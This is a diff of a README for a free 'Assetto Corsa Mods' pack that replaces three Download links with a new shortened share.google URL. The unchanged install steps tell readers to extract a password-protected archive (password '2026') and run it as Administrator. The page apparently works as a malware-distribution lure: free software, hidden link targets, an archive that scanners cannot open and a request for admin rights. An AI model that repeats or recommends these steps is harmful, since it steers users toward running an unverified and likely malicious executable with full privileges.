@@ -9,7 +9,7 @@ The **🏎️ Assetto Corsa Mods** is a **free** ultimate mod collection that gi
 
 <div align="center">
 
-[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assetto-corsa-mods)
+[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/nMJLg8zLYCwUwXiQ6)
 
 </div>
 
@@ -114,7 +114,7 @@ The **🏎️ Assetto Corsa Mods** is a **free** ultimate mod collection that gi
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup → Install mods
 
-[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assetto-corsa-mods)
+[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/nMJLg8zLYCwUwXiQ6)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -234,7 +234,7 @@ Experience ultimate racing with hundreds of mods for free. **Assetto Corsa Mods*
 
 <div align="center">
 
-[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assetto-corsa-mods)
+[![Download Assetto Corsa Mods](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/nMJLg8zLYCwUwXiQ6)
 
 **Version 4.6.1** — Free Assetto Corsa mod collection. April 2026 update. Zero cost. No payment.
 
